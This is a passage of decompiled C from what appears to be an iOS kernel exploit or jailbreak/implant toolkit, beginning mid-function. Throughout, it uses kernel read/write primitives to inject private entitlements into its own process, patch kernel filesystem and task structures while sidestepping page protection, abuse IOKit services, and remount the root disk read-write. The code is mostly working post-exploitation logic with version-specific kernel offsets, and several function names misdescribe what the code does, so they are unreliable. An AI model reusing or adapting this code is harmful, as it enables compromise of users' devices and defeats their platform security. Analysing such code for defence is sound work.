  if ( !(unsigned int)krw_inject_entitlements_to_task(
                                           krwCtx,
                        mach_task_self_,
                        "<dict><key>com.apple.private.vfs.snapshot</key><true/></dict>",
                        0,
                        8) )
    return 0;
  if ( !(unsigned int)check_necp_kread_available() )
    return 0;
  v4 = check_root_fs_mounted(&v19);
  if ( v4 && !v19 && !(unsigned int)check_root_disk_identity(krwCtx) )
    return 0;
  if ( a2 == 4 || a2 == 2 )
  {
    if ( !v4 )
    {
      v7 = a2 == 4;
      v6 = "orig-fs";
      v5 = v18;
LABEL_18:
      v8 = check_and_copy_file_paths(v5, v6, v7);
      if ( !(uint32_t)v8 )
        return v8;
      goto LABEL_21;
    }
    if ( !check_path_on_disk0s1s1(__s1) )
    {
      v8 = 1;
LABEL_21:
      krw_ctx_clr_flag(krwCtx, 1024);
      return v8;
    }
    if ( (unsigned int)check_disk0s1s1_path(krwCtx, __s1) )
    {
      v5 = __s1;
      v6 = 0;
      v7 = 0;
      goto LABEL_18;
    }
    return 0;
  }
  if ( !v4 )
  {
    if ( a2 == 1 )
    {
      if ( !(unsigned int)enumerate_file_paths(v18, "orig-fs") )
        return 0;
      v10 = 1;
    }
    else
    {
      v10 = 0;
    }
    return get_mount_disk_info(krwCtx, v10);
  }
  if ( check_path_on_disk0s1s1(__s1) )
  {
    if ( a2 == 1 )
    {
      if ( !(unsigned int)enumerate_file_paths(__s1, 0) )
        return 0;
      return (unsigned int)get_kernel_load_addr_bsm((__int64)"/dev/disk0s1s1", __s1, 0x110000u) == 0;
    }
    return check_disk0s1s1_path(krwCtx, __s1);
  }
  if ( !(unsigned int)add_rw_to_disk(krwCtx, v18, "/dev/disk0s1s1") )
    return 0;
  v11 = "rdonly,nobrowse";
  v20 = 0;
  v22[0] = "/sbin/mount_apfs";
  v22[1] = "-o";
  if ( a2 == 1 )
    v11 = "nobrowse";
  v22[2] = v11;
  v22[3] = "/dev/disk0s1s1";
  v22[4] = __s1;
  v22[5] = 0;
  if ( !memcmp(__s1, "/private/var/MobileSoftwareUpdate", 0x21u)
    && mkdir("/private/var/MobileSoftwareUpdate", 0x1FFu)
    && errno != 17 )
  {
    return 0;
  }
  if ( !(unsigned int)krw_inject_entitlements_maybe(
                        krwCtx,
                        mach_task_self_,
                        "<dict><key>com.apple.private.security.disk-device-access</key><true/></dict>") )
    return 0;
  v12 = mkdir(__s1, 0x1FFu);
  if ( v12 )
  {
    if ( errno != 17 )
      return 0;
  }
  if ( krwCtx->xnuMajorVersion >= 6153 && chown(__s1, 0x1F5u, 0x1F5u) )
    return 0;
  v13 = 6;
  while ( 1 )
  {
    v14 = posix_spawn_with_sigdefault(v22);
    if ( v14 != 49 )
      break;
    getmntinfo(&v20, 0);
    usleep(0xC8u);
    if ( !--v13 )
      goto LABEL_47;
  }
  if ( !v14 )
  {
    v16 = check_path_on_disk0s1s1(__s1);
    goto LABEL_48;
  }
LABEL_47:
  v16 = 0;
LABEL_48:
  if ( !(v16 | v12) )
  {
    rmdir(__s1);
    return 0;
  }
  if ( !v16 )
    return 0;
  if ( !check_iogpu_krw_ready_3(krwCtx, v18) || (v8 = enumerate_file_paths(__s1, 0), !(uint32_t)v8) )
  {
    check_disk0s1s1_path(krwCtx, __s1);
    return 0;
  }
  return v8;
}

//----- (00000000000148A4) ----------------------------------------------------
__int64 __fastcall check_disk0s1s1_path(struct_krwCtx *krwCtx, char *a2)
{
  __int64 result; // x0
  int v5; // [xsp+Ch] [xbp-14h] BYREF

  v5 = 0;
  result = validate_physmap_range_4(krwCtx, a2, 1, (unsigned int *)&v5);
  if ( (uint32_t)result )
  {
    if ( (unsigned int)get_kernel_load_addr_bsm((__int64)"/dev/disk0s1s1", a2, 0x110001u) )
    {
      validate_physmap_range_4(krwCtx, a2, v5, 0);
      return 0;
    }
    else
    {
      return 1;
    }
  }
  return result;
}

//----- (0000000000014920) ----------------------------------------------------
__int64 __fastcall get_mount_disk_info(struct_krwCtx *krwCtx, int a2)
{
  unsigned int v4; // w0
  __int64 v5; // x24
  char *f_mntonname; // x21
  unsigned __int64 v7; // x23
  int v8; // w0
  __int64 v9; // x24
  int v10; // w21
  int v11; // w0
  int v12; // w22
  int xnuMajorVersion; // w8
  __int64 v14; // x0
  int v15; // w0
  int v16; // w24
  int v17; // w2
  int v18; // w0
  int v20; // [xsp+0h] [xbp-50h] BYREF
  int v21; // [xsp+4h] [xbp-4Ch] BYREF
  struct statfs *v22; // [xsp+8h] [xbp-48h] BYREF

  v22 = 0;
  v4 = getmntinfo(&v22, 0);
  if ( v4 )
  {
    v5 = v4;
    f_mntonname = v22->f_mntonname;
    v7 = 1;
    do
    {
      if ( !strcmp("/", f_mntonname) )
        v7 = *(f_mntonname - 24) & 1;
      f_mntonname += 2168;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v7 = 1;
  }
  v8 = check_root_is_apfs();
  v21 = 0;
  if ( ((v7 & 1) == 0) == a2 )
    return 1;
  v10 = v8;
  if ( a2 )
  {
    v11 = open("/", 0);
    if ( v11 == -1 )
      return 0;
    v12 = v11;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 7195 && xnuMajorVersion != 6153 )
      return 0;
    v14 = get_kbase_from_fileport(krwCtx, v11);
    v9 = 0;
    if ( !v14 )
      return v9;
    v7 = v14 + 112;
    if ( v14 == -112 )
      return v9;
    if ( !kread_u32(krwCtx, v7, &v20) )
      return 0;
    v20 &= ~0x4000u;
    if ( !noppl_kwrite32(krwCtx, v7, v20) )
      return 0;
    v15 = open("/", 0);
    if ( (v15 & 0x80000000) == 0 )
    {
      v16 = v15;
      LODWORD(v22) = 0;
      ffsctl(v15, 0x80046814, &v22, 0);
      LODWORD(v22) = 1;
      ffsctl(v16, 0x80046815, &v22, 0);
      LODWORD(v22) = 2;
      if ( v10 )
      {
        ffsctl(v16, 0x80044A11, &v22, 0);
        LODWORD(v22) = 3;
      }
      ffsctl(v16, 0x80046816, &v22, 0);
      close(v16);
    }
    v17 = 0x10000;
  }
  else
  {
    if ( v8 && !(unsigned int)validate_physmap_range_4(krwCtx, "/", 1, (unsigned int *)&v21) )
      return 0;
    v17 = 268500993;
    v12 = -1;
  }
  if ( v10 )
    v18 = get_kernel_load_addr_bsm((__int64)"/dev/disk0s1s1", "/", v17);
  else
    v18 = remount_hfs((__int64)"/dev/disk0s1s1", "/", v17);
  if ( v18 == -1 )
  {
    v9 = 0;
    if ( a2 )
      goto LABEL_32;
  }
  else
  {
    v9 = 1;
    if ( a2 )
    {
LABEL_32:
      if ( kread_u32(krwCtx, v7, &v20) )
      {
        v20 |= 0x4000u;
        if ( noppl_kwrite32(krwCtx, v7, v20) )
        {
          close(v12);
          return v9;
        }
      }
      return 0;
    }
  }
  if ( (((unsigned int)v9 | !v10) & 1) == 0 && !(unsigned int)validate_physmap_range_4(krwCtx, "/", v21, 0) )
    return 0;
  return v9;
}

//----- (0000000000014BEC) ----------------------------------------------------
__int64 __fastcall get_root_prefix_path(__int64 a1, void *a2, uint32_t *a3, int *a4)
{
  int v7; // w20
  const char *v8; // x23
  size_t v9; // x24
  __int64 result; // x0

  v7 = check_root_fs_mounted(0);
  if ( v7 )
  {
    if ( !check_path_on_disk0s1s1("/private/var/MobileSoftwareUpdate/mnt1") )
    {
      LODWORD(v9) = 0;
LABEL_10:
      *a3 = v9;
      result = 1;
      if ( !a4 )
        return result;
      goto LABEL_11;
    }
    v8 = "/private/var/MobileSoftwareUpdate/mnt1/";
  }
  else
  {
    v8 = "/";
  }
  v9 = strlen(v8) + 1;
  if ( v9 <= (unsigned int)*a3 )
  {
    memcpy(a2, v8, v9);
    goto LABEL_10;
  }
  result = 0;
  if ( a4 )
LABEL_11:
    *a4 = v7;
  return result;
}

//----- (0000000000014CA4) ----------------------------------------------------
__int64 __fastcall get_kbase_from_fileport(struct_krwCtx *krwCtx, int w1_0)
{
  __int64 v3; // x19
  unsigned __int64 v4; // x0
  int xnuMajorVersion; // w8
  __int64 v9; // [xsp+8h] [xbp-28h] BYREF
  unsigned __int64 v10; // [xsp+10h] [xbp-20h] BYREF
  mach_port_t a2; // [xsp+1Ch] [xbp-14h] BYREF

  a2 = 0;
  if ( !(unsigned int)j__fileport_makeport(w1_0, &a2) && a2 )
  {
    v4 = get_task_kobject_addr(krwCtx, a2);
    if ( !v4 )
      goto LABEL_19;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 7195 && xnuMajorVersion != 6153 )
      return 0;
    if ( kread_physmap_decorated(krwCtx, v4 + 56, &v10)
      && validate_kaddr_range(krwCtx, v10)
      && kread_physmap_decorated(krwCtx, v10 + 216, (unsigned __int64 *)&v9) )
    {
      if ( validate_kaddr_range(krwCtx, v9) )
        v3 = v9;
      else
        v3 = 0;
    }
    else
    {
LABEL_19:
      v3 = 0;
    }
    mach_port_destroy(mach_task_self_, a2);
    return v3;
  }
  return 0;
}

//----- (0000000000014D98) ----------------------------------------------------
__int64 __fastcall validate_physmap_range_4(struct_krwCtx *krwCtx, char *a2, int a3, unsigned int *a4)
{
  int v7; // w0
  int v8; // w19
  __int64 v9; // x0
  int xnuMajorVersion; // w8
  __int64 v11; // x8
  __int64 v12; // x23
  mach_vm_address_t v13; // x24
  unsigned int v15; // [xsp+Ch] [xbp-34h] BYREF

  v7 = open(a2, 0);
  if ( v7 != -1 )
  {
    v8 = v7;
    v9 = get_kernel_base_physmap(krwCtx, v7);
    if ( v9 )
    {
      xnuMajorVersion = krwCtx->xnuMajorVersion;
      if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
      {
        v11 = 548;
      }
      else if ( xnuMajorVersion == 6153 )
      {
        v11 = 456;
      }
      else
      {
        if ( xnuMajorVersion != 7195 )
          goto LABEL_18;
        v11 = 476;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
          v11 = 452;
      }
      v13 = v11 + v9;
      v12 = 0;
      if ( !kread_u32(krwCtx, v11 + v9, &v15) || v15 > 1 )
        goto LABEL_19;
      if ( noppl_kwrite32(krwCtx, v13, a3) )
      {
        if ( a4 )
          *a4 = v15;
        v12 = 1;
        goto LABEL_19;
      }
    }
LABEL_18:
    v12 = 0;
LABEL_19:
    close(v8);
    return v12;
  }
  return 0;
}

//----- (0000000000014EC4) ----------------------------------------------------
__int64 __fastcall get_kernel_load_addr_bsm(__int64 a1, const char *a2, unsigned int a3)
{
  struct apfs_mount_args
  {
    uint64_t device;
    uint64_t flags;
    uint8_t reserved[0x118];
  } args = {0};

  args.device = a1;
  args.flags = a3;
  return mount("apfs", a2, a3, &args);
}

//----- (0000000000014F5C) ----------------------------------------------------
__int64 __fastcall remount_hfs(__int64 a1, const char *a2, int a3)
{
  struct hfs_mount_args
  {
    uint64_t device;
    uint8_t reserved[0x28];
  } args = {0};

  args.device = a1;
  return mount("hfs", a2, a3, &args);
}

//----- (0000000000014F9C) ----------------------------------------------------
bool check_root_is_apfs()
{
  unsigned int v0; // w0
  bool v1; // w23
  __int64 v2; // x22
  char *f_mntonname; // x19
  struct statfs *v5; // [xsp+8h] [xbp-38h] BYREF

  v5 = 0;
  v0 = getmntinfo(&v5, 0);
  v1 = 0;
  if ( v0 )
  {
    v2 = v0;
    f_mntonname = v5->f_mntonname;
    do
    {
      if ( !strcmp("/", f_mntonname) )
        v1 = strncmp("apfs", f_mntonname - 16, 0x10u) == 0;
      f_mntonname += 2168;
      --v2;
    }
    while ( v2 );
  }
  return v1;
}

//----- (000000000001503C) ----------------------------------------------------
__int64 __fastcall krw_inject_entitlements_maybe(struct_krwCtx *krwCtx, __int64 task, char *entitlementXml)
{
  uint32_t targetTask; // w23
  uint64_t ok; // x24
  void *entitlementXmlBuffer; // x22
  CFPropertyListRef entitlementDict; // x21
  const struct __CFData *entitlementData; // x20
  CFPropertyListFormat format; // [xsp+8h] [xbp-108h] BYREF
  CFTypeRef serviceEntitlements; // [xsp+10h] [xbp-100h] BYREF
  EntitlementIokitPayload iokitPayload; // [xsp+18h] [xbp-F8h] BYREF
  EntitlementIokitThreadArg iokitThreadArg; // [xsp+30h] [xbp-E0h] BYREF
  pthread_t thread; // [xsp+40h] [xbp-D0h] BYREF
  pthread_attr_t attr; // [xsp+48h] [xbp-C8h] BYREF

  targetTask = task;
  format = kCFPropertyListXMLFormat_v1_0;
  serviceEntitlements = 0;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
    return krw_inject_entitlements2_maybe(krwCtx, task, entitlementXml, 1);

  ok = 0;
  if ( (unsigned int)acquire_write_semaphore_lock(krwCtx, 0, 0x2710u) )
    return ok;

  entitlementXmlBuffer = 0;
  entitlementDict = 0;
  entitlementData = 0;
  EntitlementFindConnectArgs findArgs = {
    .krwCtx = (uint64_t)krwCtx,
    .task = targetTask,
    .reserved0 = 0,
    .cfOut = &serviceEntitlements,
    .ok = 0,
    .reserved1 = 0,
  };

  if ( !pthread_create_and_join(krwCtx, (__int64)find_connect_ioavservice, &findArgs) )
    goto cleanup;
  if ( !findArgs.ok )
    goto cleanup;

  entitlementData = CFDataCreateWithBytesNoCopy(
                      kCFAllocatorDefault,
                      (const UInt8 *)entitlementXml,
                      strlen(entitlementXml) + 1,
                      kCFAllocatorNull);
  if ( !entitlementData )
    goto cleanup;

  entitlementDict = CFPropertyListCreateWithData(kCFAllocatorDefault, entitlementData, 0, &format, 0);
  if ( !entitlementDict )
    goto cleanup;

  if ( (unsigned int)merge_cfdict_entries(serviceEntitlements, entitlementDict) )
  {
    if ( (unsigned int)compare_cfdict_entries(serviceEntitlements, entitlementDict) )
      goto cleanup;

    bool useIokitWorker = krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0)
                       && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0;
    if ( useIokitWorker )
    {
      iokitPayload.krwCtx = (uint64_t)krwCtx;
      iokitPayload.task = targetTask;
      iokitPayload.reserved = 0;
      iokitPayload.cf = serviceEntitlements;
      if ( pthread_attr_init(&attr) )
        goto cleanup;
      if ( pthread_attr_setdetachstate(&attr, 1) )
      {
        pthread_attr_destroy(&attr);
        goto cleanup;
      }
      thread = 0;
      iokitThreadArg.payload = &iokitPayload;
      iokitThreadArg.status = 4097;
      void *(__cdecl *worker)(void *) = (void *(__cdecl *)(void *))nullsub_1(get_kernel_task_iokit);
      if ( pthread_create(&thread, &attr, worker, &iokitThreadArg) || pthread_join(thread, 0) )
      {
        pthread_attr_destroy(&attr);
        goto cleanup;
      }
      int workerStatus = iokitThreadArg.status;
      pthread_attr_destroy(&attr);
      if ( workerStatus )
        goto cleanup;
    }
    else
    {
      const struct __CFData *serializedEntitlements =
        CFPropertyListCreateData(kCFAllocatorDefault, serviceEntitlements, kCFPropertyListXMLFormat_v1_0, 0, 0);
      if ( !serializedEntitlements )
        goto cleanup;
      size_t serializedLength = CFDataGetLength(serializedEntitlements);
      entitlementXmlBuffer = calloc(serializedLength + 1, 1u);
      if ( !entitlementXmlBuffer )
      {
        CFRelease(serializedEntitlements);
        goto cleanup;
      }
      memcpy(entitlementXmlBuffer, CFDataGetBytePtr(serializedEntitlements), serializedLength);
      CFRelease(serializedEntitlements);

      mach_port_name_t previousNotify = 0;
      unsigned __int64 taskKaddr = 0;
      unsigned int notifyPort = register_ioservice_publish_notify(
                                  (__int64)entitlementXmlBuffer,
                                  strlen((const char *)entitlementXmlBuffer) + 1,
                                  &previousNotify);
      if ( notifyPort + 1 <= 1 )
        goto cleanup;

      int major = krwCtx->xnuMajorVersion;
      ok = ((unsigned int)(major - 8019) < 2 || major == 7195 || major == 6153)
        && (taskKaddr = get_task_kobject_addr(krwCtx, notifyPort)) != 0
        && kread_physmap_decorated(krwCtx, taskKaddr + 16, &taskKaddr)
        && kread_physmap_decorated(krwCtx, taskKaddr + 24, &taskKaddr)
        && noppl_kwrite32(krwCtx, taskKaddr + krwCtx->stride_0x168, 255);
      if ( ok )
      {
        uint8_t entitlementSnapshot[40];
        ok = (unsigned int)krw_read_thunk(krwCtx, taskKaddr, sizeof(entitlementSnapshot), entitlementSnapshot)
          && (unsigned int)kwrite_with_retry(
                              krwCtx,
                              krwCtx->gap_0x390 + krwCtx->stride_0x168,
                              (__int64)entitlementSnapshot + krwCtx->stride_0x168,
                              (unsigned int)(sizeof(entitlementSnapshot) - krwCtx->stride_0x168)) != 0;
      }
      mach_port_destroy(mach_task_self_, notifyPort);
      if ( previousNotify + 1 >= 2 )
        mach_port_destroy(mach_task_self_, previousNotify);
      if ( !ok )
        goto cleanup;
    }
  }
  ok = 1;

cleanup:
  release_write_semaphore_lock(krwCtx, 0);
  if ( serviceEntitlements )
    CFRelease(serviceEntitlements);
  if ( entitlementDict )
    CFRelease(entitlementDict);
  if ( entitlementData )
    CFRelease(entitlementData);
  if ( entitlementXmlBuffer )
    free(entitlementXmlBuffer);
  return ok;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (00000000000154D0) ----------------------------------------------------
__int64 __fastcall krw_inject_entitlements_to_task(struct_krwCtx *krwCtx, __int64 a2, char *a3, __int64 a4, int a5)
{
  __int64 result; // x0
  __int64 v10; // x23
  int v11; // [xsp+Ch] [xbp-34h] BYREF

  v11 = 0;
  if ( (a5 & 0xB) == 0 )
    return 0;
  result = task_self_get_ipc_port(krwCtx, a2);
  if ( result )
  {
    result = get_task_struct_offset(krwCtx, result);
    if ( result )
    {
      v10 = result;
      result = krw_read_thunk(krwCtx, result, 4, &v11);
      if ( (uint32_t)result )
      {
        if ( (v11 & a5) == 0 )
        {
          result = krw_inject_entitlements_maybe(krwCtx, a2, a3);
          if ( (uint32_t)result )
          {
            v11 |= a5;
            return kwrite_with_retry(krwCtx, v10, (__int64)&v11, 4);
          }
        }
      }
    }
  }
  return result;
}

//----- (00000000000155A0) ----------------------------------------------------
__int64 __fastcall find_connect_ioavservice(__int64 a1)
{
  __int64 v2; // x21
  struct_krwCtx *krwCtx; // x21
  unsigned int v3; // w1
  CFMutableDictionaryRef *v4; // x25
  __int64 result; // x0
  io_service_t v6; // w20
  __int64 v7; // x22
  int v8; // w0
  kern_return_t v9; // w23
  int v10; // w24
  int v11; // w0
  unsigned __int64 v12; // x0
  unsigned __int64 v13; // x23
  io_object_t v14; // w22
  mach_vm_address_t v15; // x23
  __int64 v16; // x2
  kern_return_t v17; // w24
  io_iterator_t iterator[2]; // [xsp+8h] [xbp-68h] BYREF
  CFMutableDictionaryRef properties; // [xsp+10h] [xbp-60h] BYREF
  __int64 v20; // [xsp+18h] [xbp-58h] BYREF
  __int64 v21; // [xsp+20h] [xbp-50h] BYREF
  io_connect_t connect; // [xsp+2Ch] [xbp-44h] BYREF

  v2 = *(uint64_t *)a1;
  krwCtx = KRWCTX_FROM_UINTPTR(v2);
  v3 = *(uint32_t *)(a1 + 8);
  v4 = *(CFMutableDictionaryRef **)(a1 + 16);
  connect = 0;
  v20 = 0;
  v21 = 0;
  properties = 0;
  result = necp_set_opt_string_6(krwCtx, v3);
  if ( !(uint32_t)result )
    goto LABEL_14;
  result = validate_kaddr_range(v2, *(uint64_t *)(v2 + 912));
  if ( !result )
    goto LABEL_14;
  if ( *(int *)(v2 + 320) < 7195 )
  {
    result = (__int64)ioservice_get_matching("AppleM2ScalerCSCDriver");
    v6 = result;
  }
  else
  {
    v6 = ioservice_get_matching("AppleKeyStore");
    result = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED);
    if ( !(uint32_t)result )
    {
      v7 = *(uint64_t *)(v2 + 936);
      goto LABEL_8;
    }
  }
  v7 = 0;
LABEL_8:
  if ( v6 + 1 < 2 )
  {
LABEL_14:
    v10 = 0;
    goto LABEL_15;
  }
  if ( v7 )
  {
    if ( !necp_set_opt_string_7(krwCtx, *(uint32_t *)(v2 + 892), 0) )
    {
LABEL_19:
      v10 = 0;
      goto LABEL_20;
    }
    v9 = IOServiceOpen(v6, mach_task_self_, 0, &connect);
    v10 = 0;
    if ( !necp_set_opt_string_7(krwCtx, *(uint32_t *)(v2 + 892), v7) || v9 )
      goto LABEL_20;
LABEL_17:
    iterator[0] = 0;
    v12 = get_task_kobject_addr(krwCtx, connect);
    if ( !v12 )
      goto LABEL_19;
    v13 = v12;
    if ( IORegistryEntryGetChildIterator(v6, "IOService", iterator) )
      goto LABEL_19;
    while ( 1 )
    {
      v14 = IOIteratorNext(iterator[0]);
      if ( !v14 )
        break;
      if ( v13 == get_task_kobject_addr(krwCtx, v14) )
        goto LABEL_27;
      IOObjectRelease(v14);
    }
    v13 = 0;
LABEL_27:
    IOObjectRelease(iterator[0]);
    v10 = 0;
    if ( !v14 || !v13 )
    {
LABEL_43:
      if ( v14 + 1 >= 2 )
        IOObjectRelease(v14);
      goto LABEL_20;
    }
    v15 = v13 + 32;
    if ( kread_physmap_decorated(krwCtx, v15, (unsigned __int64 *)&v21) )
    {
      v16 = *(uint64_t *)(v2 + 912);
      if ( *(uint64_t *)(v2 + 344) < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
      {
        v20 = *(uint64_t *)(v2 + 912);
LABEL_35:
        if ( kwrite64(v2, v15, v16) )
        {
          v17 = IORegistryEntryCreateCFProperties(v14, &properties, kCFAllocatorDefault, 0);
          if ( !kwrite64(v2, v15, v21) || v17 )
          {
            if ( properties )
              CFRelease(properties);
          }
          else if ( properties )
          {
            *v4 = properties;
            v10 = 1;
            goto LABEL_43;
          }
        }
        goto LABEL_42;
      }
      if ( kread_physmap_decorated(krwCtx, v16 + 136, (unsigned __int64 *)&v20) && validate_kaddr_range(v2, v20) )
      {
        v16 = v20;
        goto LABEL_35;
      }
    }
LABEL_42:
    v10 = 0;
    goto LABEL_43;
  }
  v10 = 0;
  if ( !IOServiceOpen(v6, mach_task_self_, 0, &connect) )
    goto LABEL_17;
LABEL_20:
  if ( connect + 1 >= 2 )
  {
    *(uint64_t *)iterator = 1;
    IOServiceClose(connect);
    IOServiceWaitQuiet(v6, (mach_timespec_t *)iterator);
  }
  result = IOObjectRelease(v6);
LABEL_15:
  *(uint32_t *)(a1 + 24) = v10;
  return result;
}
// 15664: variable 'v8' is possibly undefined
// 1569C: variable 'v11' is possibly undefined

//----- (0000000000015880) ----------------------------------------------------
__int64 __fastcall get_kernel_task_iokit(__int64 a1)
{
  __int64 v2; // x21
  struct_krwCtx *krwCtx; // x21
  task_inspect_t v3; // w25
  const void *v4; // x20
  host_t v5; // w0
  kern_return_t v6; // w0
  int v7; // w23
  unsigned int v8; // w22
  vm_address_t v9; // x1
  unsigned __int64 v10; // x20
  mach_port_t v11; // w8
  thread_act_t v12; // w0
  kern_return_t v13; // w0
  unsigned int v14; // w8
  const struct __CFData *v16; // x0
  const struct __CFData *v17; // x20
  const UInt8 *BytePtr; // x22
  unsigned int Length; // w0
  unsigned int v20; // w24
  bool v21; // zf
  unsigned __int64 v22; // x0
  int v23; // w26
  int v24; // w8
  thread_act_t v27; // w0
  mach_port_t v28; // w0
  kern_return_t v29; // w0
  unsigned __int64 v30; // x23
  mach_port_t v31; // w8
  thread_act_t v32; // w0
  int v33; // w0
  int v34; // w0
  unsigned __int64 v35; // x0
  __int64 v36; // x8
  int v37; // w0
  unsigned __int64 v38; // [xsp+0h] [xbp-70h] BYREF
  task_suspension_token_t suspend_token[2]; // [xsp+8h] [xbp-68h] BYREF
  vm_address_t address; // [xsp+10h] [xbp-60h] BYREF
  io_master_t io_master[2]; // [xsp+18h] [xbp-58h] BYREF

  v2 = **(uint64_t **)a1;
  krwCtx = KRWCTX_FROM_UINTPTR(v2);
  v3 = *(uint32_t *)(*(uint64_t *)a1 + 8LL);
  v4 = *(const void **)(*(uint64_t *)a1 + 16LL);
  address = 0;
  *(uint64_t *)io_master = 0;
  *(uint64_t *)suspend_token = 0;
  v5 = mach_host_self();
  v6 = host_get_io_master(v5, &io_master[1]);
  if ( !v6 )
  {
    v6 = mach_port_allocate(mach_task_self_, 1u, io_master);
    if ( !v6 )
    {
      v7 = 708617;
      v16 = IOCFSerialize(v4, 1u);
      if ( !v16 )
        goto LABEL_4;
      v17 = v16;
      BytePtr = CFDataGetBytePtr(v16);
      Length = CFDataGetLength(v17);
      v20 = Length;
      if ( BytePtr )
        v21 = Length == 0;
      else
        v21 = 1;
      if ( v21 )
        goto LABEL_56;
      if ( !*(uint64_t *)(v2 + 6568) )
      {
        v22 = kernel_cstring_pattern_scan(v2, "iokit.OSDictionary");
        if ( !v22 )
        {
          v7 = 708625;
          goto LABEL_56;
        }
        *(uint64_t *)(v2 + 6568) = v22;
      }
      v23 = 163855;
      v24 = *(uint32_t *)(v2 + 320);
      if ( (unsigned int)(v24 - 8019) >= 2 && v24 != 7195 && v24 != 6153 )
      {
        v7 = 163857;
        goto LABEL_56;
      }
      v27 = mach_thread_self();
      if ( !set_thread_abs_realtime_50(v27) )
      {
        v7 = 163896;
        goto LABEL_56;
      }
      v28 = mach_thread_self();
      v7 = kwrite_task_kobj_field_via_physmap(krwCtx, v28, 1, 1, 96);
      if ( v7 )
      {
LABEL_56:
        v8 = 0;
LABEL_57:
        CFRelease(v17);
        goto LABEL_5;
      }
      thread_switch(0, 2, 0xAu);
      if ( mach_task_self_ == v3 )
      {
        v29 = task_threads(v3, (thread_act_array_t *)&address, &suspend_token[1]);
        if ( !v29 )
        {
          if ( suspend_token[1] )
          {
            v30 = 0;
            do
            {
              if ( (unsigned int)(*(uint32_t *)(address + 4 * v30) + 1) >= 2 )
              {
                v31 = mach_thread_self();
                v32 = *(uint32_t *)(address + 4 * v30);
                if ( v31 != v32 )
                  thread_suspend(v32);
              }
              ++v30;
            }
            while ( v30 < suspend_token[1] );
          }
LABEL_58:
          if ( necp_set_opt_string_7(krwCtx, *(uint32_t *)(v2 + 888), 0) )
          {
            v34 = scan_kernel_page_for_pattern(
                    krwCtx,
                    *(uint64_t *)(v2 + 6568),
                    0x28u,
                    *(uint64_t *)(v2 + 912),
                    (__int64 (__fastcall *)(__int64, __int64))test_appsepmanager_presence,
                    0);
            if ( v34 )
            {
              v8 = 0;
              v23 = v34;
LABEL_63:
              v7 = v23;
              goto LABEL_57;
            }
            v8 = ioservice_notification_send(io_master[1], (__int64)"IOServicePublish", (__int64)BytePtr, v20, io_master[0], 0, 0);
            if ( v8 )
            {
              v35 = get_task_kobject_addr(krwCtx, v8);
              v38 = v35;
              if ( v35 )
              {
                if ( kread_physmap_decorated(krwCtx, v35 + 16, &v38)
                  && kread_physmap_decorated(krwCtx, v38 + 24, &v38) )
                {
                  v36 = *(uint64_t *)(v2 + 912);
                  if ( v36 == v38 )
                  {
                    if ( noppl_kwrite32(v2, v36 + *(int *)(v2 + 360), 255) )
                    {
                      if ( necp_set_opt_string_7(krwCtx, *(uint32_t *)(v2 + 888), *(uint64_t *)(v2 + 928)) )
                        v23 = 0;
                      else
                        v23 = 163856;
                    }
                    else
                    {
                      v23 = 163856;
                    }
                  }
                  else
                  {
                    v23 = 163900;
                  }
                }
              }
              else
              {
                v23 = 163854;
              }
              goto LABEL_63;
            }
          }
          else
          {
            v8 = 0;
          }
          v23 = 4097;
          goto LABEL_63;
        }
      }
      else
      {
        v29 = task_suspend2(v3, suspend_token);
        if ( !v29 )
          goto LABEL_58;
      }
      v7 = v29 | 0x80000000;
      goto LABEL_56;
    }
  }
  v7 = v6 | 0x80000000;
LABEL_4:
  v8 = 0;
LABEL_5:
  if ( suspend_token[1] )
  {
    v9 = address;
    if ( address )
    {
      v10 = 0;
      do
      {
        if ( (unsigned int)(*(uint32_t *)(v9 + 4 * v10) + 1) >= 2 )
        {
          v11 = mach_thread_self();
          v12 = *(uint32_t *)(address + 4 * v10);
          if ( v11 != v12 )
            thread_resume(v12);
        }
        ++v10;
        v9 = address;
      }
      while ( v10 < suspend_token[1] );
      vm_deallocate(mach_task_self_, address, 4LL * suspend_token[1]);
    }
  }
  if ( suspend_token[0] + 1 >= 2 )
  {
    v13 = task_resume2(suspend_token[0]);
    v14 = v13 | 0x80000000;
    if ( v7 )
      v14 = v7;
    if ( v13 )
      v7 = v14;
  }
  if ( io_master[1] + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, io_master[1]);
  if ( v8 + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, v8);
  if ( io_master[0] + 1 >= 2 )
    mach_port_mod_refs(mach_task_self_, io_master[0], 1u, -1);
  *(uint32_t *)(a1 + 8) = v7;
  return 0;
}
// 15B94: variable 'v33' is possibly undefined
// 15C84: variable 'v37' is possibly undefined
